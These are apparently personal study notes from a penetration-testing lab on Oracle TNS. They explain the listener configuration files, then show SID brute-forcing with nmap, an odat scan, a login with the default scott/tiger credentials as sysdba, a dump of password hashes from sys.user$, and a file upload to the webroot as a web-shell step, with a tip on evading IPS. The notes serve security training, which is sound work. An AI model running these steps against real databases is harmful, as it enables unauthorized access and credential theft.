Commonly on TCP/1521


The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle Databases and applications over networks. Initally introduced as part of Oracle net services software suite, TNS supports various networking protocol such as IPX/SPX and the traditional TCP/IP stack. 

Over time TNS has been updated to support newer tech like SSL and ipv6


So Oracle TNS is designed to connect to a Oracle database
https://www.oracle.com/database/

Oracle TNS is a network protocol used exclusively by Oracle database clients to connect to Oracle database servers.


the listener will use Oracle Net Services to encrypt the communication between the client and the server. The configuration files for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin` directory. The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol.



Oracle TNS is often used with Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application server, Oracle Enterprise manager, and more. basically anything with Oracle in the name.


each database or service has a unique entry in the tnsnames.ora file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location and the database or service name that clients should use when connecting to the service. For example a simple tnsnames.org file might look like this.


#### Tnsnames.ora

Code: txt

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

Here we can see a service called `ORCL`, which is listening on port `TCP/1521` on the IP address `10.129.11.102`. Clients should use the service name `orcl` when connecting to the service. However, the tnsnames.ora file can contain many such entries for different databases and services. The entries can also include additional information, such as authentication details, connection pooling settings, and load balancing configurations.

On the other hand, the `listener.ora` file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.

#### Listener.ora

Code: txt

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```


In short, the client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses, while the listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener.





## ODAT 

Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.


Let's now use `nmap` to scan the default Oracle TNS listener port.

#### Nmap

Oracle TNS

```shell-session
JackTheWizard@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
```


In oracle DBMS,  a System Identifier (SID) is a unique name that identifies a particular database instance. It ca have multiple instances but each one needs its own SID. When a client connects to a oracle database it specifies the databases SID along with the connect string. the clinet uses this SID to identify which database instance it wants to connect to. 


Suppose the client does not specify a SID. Then, the default value defined in the `tnsnames.ora` file is used.

The SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database administrators can use the SID to monitor and manage the individual instances of a database. For example, they can start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.

There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like `nmap`, `hydra`, `odat`, and others. Let us use `nmap` first.

#### Nmap - SID Bruteforcing

Oracle TNS

```shell-session
JackTheWizard@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```



We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the `all` option and try all modules of the `odat.py` tool.

#### ODAT

Oracle TNS

```shell-session
JackTheWizard@htb[/htb]$ ./odat.py all -s 10.129.204.235
```


In this example, we found valid credentials for the user `scott` and his password `tiger`. After that, we can use the tool `sqlplus` to connect to the Oracle database and interact with it.

#### SQLplus - Log In

Oracle TNS

```shell-session
JackTheWizard@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
```


#### Oracle RDBMS - Interaction
## SQL
Oracle TNS

```shell-session
SQL> select table_name from all_tables;
# Get db info
```shell-session
SQL> select * from user_role_privs; # find out privledges
shell-session
select name, password from sys.user$; # get hashes
```




```

#### Oracle RDBMS - Database Enumeration

Oracle TNS

```shell-session
JackTheWizard@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
```


## Web shell upload

If the target is running a web server you can upload a web shell. 


On linux the default location for web content is /var/www/html 

On windows it is C:\inetpub\wwwroot


First we will try with a file that doesnt look dangerous as not to get flagged by IPS

```shell-session
JackTheWizard@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt

JackTheWizard@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.

Oracle TNS

```shell-session
JackTheWizard@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
```







Ok after running 


./odat.py all -s *Ip address* 

I get the credentials scott/tiger so lets connect to it as the sys admin 


sqlplus scott/tiger@10.129.205.19/XE as sysdba

```shell-session
select name, password from sys.user$;
```

Then since i can do as sysdba since the user scott is allowed to i can get the ash

Okay and lets get the hashes! 

Ok so lets see what tables exist

select table_name from all_tables;



#### Oracle-Tools-setup.sh

Code: bash

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

After that, we can try to determine if the installation was successful by running the following command:

Btw

